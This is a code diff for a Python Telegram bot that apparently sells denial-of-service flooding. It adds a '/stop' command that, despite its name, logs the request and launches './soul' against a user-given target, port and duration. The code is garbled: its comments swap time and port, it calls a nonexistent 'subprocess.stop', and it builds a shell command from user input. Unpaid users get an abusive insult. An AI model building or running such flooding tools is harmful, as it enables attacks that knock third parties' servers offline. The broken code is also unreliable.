@@ -298,7 +298,35 @@ def handle_attack(message):
 
     bot.reply_to(message, response)
 
+# Handler for /attack command
+@bot.message_handler(commands=['stop'])
+def handle_stop(message):
+    user_id = str(message.chat.id)
+    if user_id in allowed_user_ids:
+       
+        
+        command = message.text.split()
+        if len(command) == 4:  # Updated to accept target, time, and port
+            target = command[1]
+            port = int(command[2])  # Convert time to integer
+            time = int(command[3])  # Convert port to integer
+            if time > 9999999:
+                response = "Error: Time interval must be less than 9999999."
+            else:
 
+                record_command_logs(user_id, '/stop', target, port, time)
+                log_command(user_id, target, port, time)
+                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                full_command = f"./soul {target} {port} {time} 100"
+                subprocess.stop(full_command, shell=True)
+                response = f"Flooding Complete"
+        else:
+            response = "Usage :- /stop <target> <port> <time>"  # Updated command syntax
+    else:
+        response = " ❌ Pehle BUY krke aa BHENCHOD - @GyrangeYT "
+
+    bot.reply_to(message, response)
+            
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
